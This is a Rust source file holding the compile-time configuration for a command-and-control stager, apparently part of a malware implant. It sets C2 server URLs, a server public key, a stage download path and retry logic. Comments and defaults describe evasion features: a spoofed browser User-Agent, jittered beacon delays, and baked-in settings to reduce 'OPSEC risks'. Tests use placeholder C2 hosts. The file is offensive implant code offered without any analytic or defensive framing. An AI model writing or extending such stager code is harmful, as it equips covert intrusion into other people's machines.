//! Stager configuration - baked at compile time
//!
//! All configuration values are embedded during compilation to avoid
//! runtime config parsing and associated OPSEC risks.

/// Stager configuration baked at compile time
#[derive(Clone)]
pub struct StagerConfig {
    /// C2 server URLs (tried in order)
    pub c2_urls: &'static [&'static str],

    /// Server's X25519 public key (32 bytes)
    pub server_public_key: [u8; 32],

    /// HTTP profile identifier
    pub profile_id: &'static str,

    /// Stage endpoint path
    pub stage_path: &'static str,

    /// User-Agent header
    pub user_agent: &'static str,

    /// Connection timeout in seconds
    pub connect_timeout_secs: u32,

    /// Read timeout in seconds
    pub read_timeout_secs: u32,

    /// Maximum retry attempts per server
    pub max_retries: u32,

    /// Base retry delay in milliseconds
    pub retry_delay_ms: u32,

    /// Jitter percentage (0-100)
    pub jitter_percent: u8,
}

impl StagerConfig {
    /// Create a new configuration (const for compile-time embedding)
    pub const fn new(
        c2_urls: &'static [&'static str],
        server_public_key: [u8; 32],
        profile_id: &'static str,
    ) -> Self {
        Self {
            c2_urls,
            server_public_key,
            profile_id,
            stage_path: "/api/v1/stage",
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            connect_timeout_secs: 30,
            read_timeout_secs: 120,
            max_retries: 3,
            retry_delay_ms: 5000,
            jitter_percent: 20,
        }
    }

    /// Create with custom stage path
    pub const fn with_stage_path(mut self, path: &'static str) -> Self {
        self.stage_path = path;
        self
    }

    /// Create with custom user agent
    pub const fn with_user_agent(mut self, ua: &'static str) -> Self {
        self.user_agent = ua;
        self
    }

    /// Create with custom timeouts
    pub const fn with_timeouts(mut self, connect: u32, read: u32) -> Self {
        self.connect_timeout_secs = connect;
        self.read_timeout_secs = read;
        self
    }

    /// Create with custom retry settings
    pub const fn with_retries(mut self, max: u32, delay_ms: u32, jitter: u8) -> Self {
        self.max_retries = max;
        self.retry_delay_ms = delay_ms;
        self.jitter_percent = if jitter > 100 { 100 } else { jitter };
        self
    }

    /// Calculate jittered delay
    pub fn jittered_delay(&self, base_ms: u32, rng_value: u32) -> u32 {
        if self.jitter_percent == 0 {
            return base_ms;
        }
        let jitter_range = (base_ms * self.jitter_percent as u32) / 100;
        let jitter = rng_value % (jitter_range * 2 + 1);
        base_ms.saturating_sub(jitter_range).saturating_add(jitter)
    }
}

impl Default for StagerConfig {
    fn default() -> Self {
        Self {
            c2_urls: &[],
            server_public_key: [0u8; 32],
            profile_id: "default",
            stage_path: "/api/v1/stage",
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            connect_timeout_secs: 30,
            read_timeout_secs: 120,
            max_retries: 3,
            retry_delay_ms: 5000,
            jitter_percent: 20,
        }
    }
}

/// Macro to bake configuration at compile time
#[macro_export]
macro_rules! bake_config {
    (
        c2_urls: [$($url:expr),* $(,)?],
        server_key: $key:expr,
        profile: $profile:expr
        $(, stage_path: $path:expr)?
        $(, user_agent: $ua:expr)?
        $(, connect_timeout: $ct:expr)?
        $(, read_timeout: $rt:expr)?
        $(, max_retries: $mr:expr)?
        $(, retry_delay: $rd:expr)?
        $(, jitter: $j:expr)?
    ) => {{
        const URLS: &[&str] = &[$($url),*];
        let mut config = $crate::StagerConfig::new(
            URLS,
            $key,
            $profile,
        );
        $(config = config.with_stage_path($path);)?
        $(config = config.with_user_agent($ua);)?
        $(config = config.with_timeouts($ct, config.read_timeout_secs);)?
        $(config = config.with_timeouts(config.connect_timeout_secs, $rt);)?
        $(config = config.with_retries($mr, config.retry_delay_ms, config.jitter_percent);)?
        $(config = config.with_retries(config.max_retries, $rd, config.jitter_percent);)?
        $(config = config.with_retries(config.max_retries, config.retry_delay_ms, $j);)?
        config
    }};
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_creation() {
        let config = StagerConfig::new(
            &["https://c2.example.com"],
            [0u8; 32],
            "test",
        );
        assert_eq!(config.c2_urls.len(), 1);
        assert_eq!(config.profile_id, "test");
    }

    #[test]
    fn test_jittered_delay() {
        let config = StagerConfig::default().with_retries(3, 1000, 20);

        // With 20% jitter on 1000ms base, result should be 800-1200
        for i in 0..100 {
            let delay = config.jittered_delay(1000, i * 17);
            assert!(delay >= 800 && delay <= 1200, "delay {} out of range", delay);
        }
    }

    #[test]
    fn test_zero_jitter() {
        let config = StagerConfig::default().with_retries(3, 1000, 0);
        assert_eq!(config.jittered_delay(1000, 12345), 1000);
    }

    #[test]
    fn test_config_macro() {
        let config = bake_config!(
            c2_urls: ["https://c2.example.com", "https://backup.example.com"],
            server_key: [1u8; 32],
            profile: "amazon"
        );
        assert_eq!(config.c2_urls.len(), 2);
        assert_eq!(config.server_public_key, [1u8; 32]);
    }
}
